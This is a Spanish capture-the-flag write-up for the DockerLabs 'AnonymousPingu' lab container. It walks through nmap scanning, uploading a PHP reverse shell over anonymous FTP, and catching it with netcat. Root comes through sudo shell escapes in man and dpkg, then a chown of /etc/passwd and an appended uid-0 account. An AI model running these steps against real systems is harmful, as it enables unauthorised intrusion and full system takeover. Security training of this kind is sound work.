# Máquina AnonymousPingu

Dificultad -> Easy

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
80/tcp open  http    syn-ack
```

Lanzamos un conjunto de scripts predeterminado con **nmap** para que nos reporte más información relacionada a los puertos descubiertos en el anterior escaneo.

```shell
nmap -sCV -p 172.17.0.2 -oN targeted
________________________________________________
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0            7816 Nov 25  2019 about.html
| -rw-r--r--    1 0        0            8102 Nov 25  2019 contact.html
| drwxr-xr-x    1 0        0             118 Jan 01  1970 css
| drwxr-xr-x    1 0        0               0 Apr 28 18:28 heustonn-html
| drwxr-xr-x    1 0        0             574 Oct 23  2019 images
| -rw-r--r--    1 0        0           20162 Apr 28 18:32 index.html
| drwxr-xr-x    1 0        0              62 Oct 23  2019 js
| -rw-r--r--    1 0        0            9808 Nov 25  2019 service.html
|_drwxrwxrwx    1 33       33              0 Apr 28 21:08 upload [NSE: writeable]
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Mantenimiento
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

Vemos mucha información por parte del servicio ftp, donde está habilitado el user **anonymous**.
Observamos que toda la info que nos reporta en el servicio **ftp** son los archivos fuente de la **web** que corre por el puerto 80.
Además, comprobamos que el directorio **/upload** dentro de la web, tiene capacidad de **directory list**, de forma que será fácil la intrusión.
Podremos subir una **reverse shell** y acceder a ella desde la web para ganar acceso.
En mi caso la subiré al directorio **/upload**, pero quizás no sea necesario que sea subida ahí.

Subiré la reverse shell típica de **PentestMonkey** -> [Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

```shell
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
mv php-reverse-shell.php shell.php
```

(Acuérdate de cambiar la IP a tu IP correspondiente y el puerto que quieras)

![Pasted image 20240429005132](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/45802db3-6d7b-4747-9dcb-9d0401a43b09)

```shell
ftp 172.17.0.2
-> anonymous
cd upload/
put shell.php
```

Nos ponemos en escucha con **netcat**:

```shell
sudo nc -nlvp 443
```

Accedemos a la **reverse shell** que ya debería estar alojada en la web.

```
http://172.17.0.2/upload/shell.php
```

Hemos ganado acceso a la máquina !
Aplicamos como siempre el tratamiento de la **tty**

------------
## Escalada de privilegios

Si hacemos **sudo -l** vemos que podemos ejecutar **man** como el usuario **pingu**. Podemos abusar de este para migrar a ese user.

```shell
sudo -l
--------------------------------
User www-data may run the following commands on 13d79de146ba:
    (pingu) NOPASSWD: /usr/bin/man
```

```shell
sudo -u pingu man man
!/bin/bash
whoami
------------------------
pingu
```

Hemos salido del contexto de **man** y migramos al user **pingu**.

Hacemos otra vez **sudo -l**:

```shell
sudo -l
--------------------------------
User pingu may run the following commands on 4af23574d013:
    (gladys) NOPASSWD: /usr/bin/nmap
    (gladys) NOPASSWD: /usr/bin/dpkg
```

Podemos ejecutar **nmap** y **dpkg** como el user **gladys**.
Podemos repetir un proceso muy similar al de **man** con **dpkg**:

```shell
sudo -u gladys dpkg -l
!/bin/bash
```

Migramos al user **gladys**.
Hacemos otra vez **sudo -l**:

```shell
sudo -l
--------------------------------
User gladys may run the following commands on 4af23574d013:
    (root) NOPASSWD: /usr/bin/chown
```

Podemos ejecutar **chown** como **root**
Cambiamos el dueño del **/etc/passwd**:

```shell
LFILE=/etc/passwd 
sudo chown $(id -un):$(id -gn) $LFILE
ls -l /etc/passwd
--------------------------------
-rw-r--r-- 1 gladys gladys 1292 Apr 28 21:08 /etc/passwd
```

Ahora le pertenece a **gladys**.
Probamos a quitar la "**x**" que corresponde a la contraseña del usuario **root** y si la quitamos es posible que nos deje acceder sin contraseña.
Como la máquina no tiene ningún editor de texto instalado, lo que haremos será crear un nuevo usuarios con los privilegios de **root** y añadirlo al **/etc/passwd**:

```shell
LFILE=/etc/passwd
sudo chown $(id -un):$(id -gn) $LFILE
openssl passwd hola123
echo 'newroot:$1$EBhVbkUV$zW3uLFiknxfdzUV5OjQZ40:0:0::/home/newroot:/bin/bash' >> /etc/passwd
su newroot
whoami
----------------
root
```

Hemos alcanzado el nivel de privilegios máximo !
